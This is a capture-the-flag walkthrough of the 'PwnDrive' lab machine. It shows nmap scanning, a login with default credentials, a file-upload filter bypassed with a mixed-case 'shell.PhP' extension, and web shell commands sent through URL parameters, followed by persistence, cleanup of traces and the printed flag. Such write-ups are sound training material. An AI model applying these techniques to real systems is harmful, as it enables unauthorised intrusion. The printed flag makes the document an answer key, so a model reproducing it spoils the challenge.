# 🛡️ PwnDrive – Full System Compromise Walkthrough

**Target:** 10.150.150.11  
**Environment:** Windows / Apache (XAMPP)  
**Objective:** Achieve Remote Code Execution (RCE), escalate privileges to SYSTEM, and retrieve `FLAG1.txt`.

---

## 📌 Methodology: 6 Phases of System Hacking
1. Reconnaissance  
2. Scanning  
3. Gaining Access  
4. Privilege Escalation  
5. Maintaining Access  
6. Clearing Tracks  

---

## 1. 🔎 Reconnaissance

The engagement began by gathering basic information about the target environment.

### VPN Connection
A secure connection to the lab network was established via OpenVPN.

![VPN Connection](./screenshot/vpnconnection.png)  
![VPN Connection](./screenshot/initializationsequencecomplete.png)

### Target Identification
The target machine was identified within the network range:

```
10.150.150.11
```

This phase focuses on understanding the environment before active interaction.

---

## 2. 📡 Scanning

Active scanning was performed to identify open ports and running services.

### Host Discovery
```bash
nmap -sn 10.150.150.0/24
```

![Nmap Discovery](./screenshot/nmapscanning.png)

### Service Enumeration
```bash
nmap -sC -sV 10.150.150.11
```

**Findings:**
- Port 80 (HTTP) – Apache Web Server  
- Port 443 (HTTPS) – Secure Web Service  

![Service Scan](./screenshot/nmap10.150.150.11.png)

These results indicate that a web application is the primary attack surface.

---

## 3. 🔓 Gaining Access

This phase focused on exploiting vulnerabilities to obtain initial access.

### Web Application Analysis
The web application **PwnDrive** was identified as the entry point.

![Opening Web Portal](./screenshot/openipwebsite.png)

### Authentication Bypass (Weak Credentials)
An administrative login page was discovered.

![Login Interface](./screenshot/loginpage.png)

Basic credential testing revealed valid default credentials:

```
Username: admin
Password: admin
```

This allowed unauthorized access to the admin panel.

### Vulnerability Identification
The file upload functionality was found to use a **blacklist filter**, blocking `.php` files.

### Exploitation (File Upload Bypass)
The filter was bypassed using a mixed-case extension:

```
shell.PhP
```

![Uploading Shell](./screenshot/uploadshellfile.png)

### Remote Code Execution (RCE)
The uploaded shell was accessed via:

```
http://10.150.150.11/upload/2/shell.PhP?cmd=whoami
```

![RCE and Whoami Proof](./screenshot/nt.png)

### Result
```
nt authority\system
```

Initial access was successfully obtained with SYSTEM-level privileges.

---

## 4. 🔑 Privilege Escalation

In this scenario, privilege escalation was not required.

The web server was already running with **SYSTEM privileges**, which is a critical misconfiguration.

This provided full administrative control over the system immediately after exploitation.

---

## 5. 🔁 Maintaining Access

To maintain access, the uploaded web shell can be reused for persistent command execution.

### Persistence Method
- The web shell remains accessible via browser
- Allows continuous remote command execution

Example:
```
http://10.150.150.11/upload/2/shell.PhP?cmd=dir
```

This acts as a backdoor into the system as long as the file is not removed.

---

## 6. 🧹 Clearing Tracks

To minimize detection and forensic evidence, cleanup actions were performed.

### Removing Web Shell
```
del C:\xampp\htdocs\upload\2\shell.PhP
```

![Executing Cleanup](./screenshot/executing.png)

### Verification
A **403 Forbidden** response confirmed successful removal:

![Cleanup Verification](./screenshot/clearfile.png)

---

## 🎯 Flag Retrieval

With SYSTEM access, sensitive files were explored.

### Flag Location
```
C:\Users\Administrator\Desktop\FLAG1.txt
```

![Flag Path Confirmation](./screenshot/locatedflag.png)

### Flag Extraction
```
http://10.150.150.11/upload/2/shell.PhP?cmd=type C:\Users\Administrator\Desktop\FLAG1.txt
```

![Flag Captured](./screenshot/ff.png)

### Captured Flag
```
PwnTillDawnAcademyIsAwesome!!!
```

---

## Lessons Learned

- Weak passwords can lead to easy system access  
- File upload features can be dangerous if not secured  
- System misconfiguration can give full control to attackers  

---

## Mitigation

- Use strong usernames and passwords  
- Restrict file uploads properly  
- Limit system privileges  

---

## Conclusion

This lab shows how simple weaknesses can be combined to gain full access to a system.

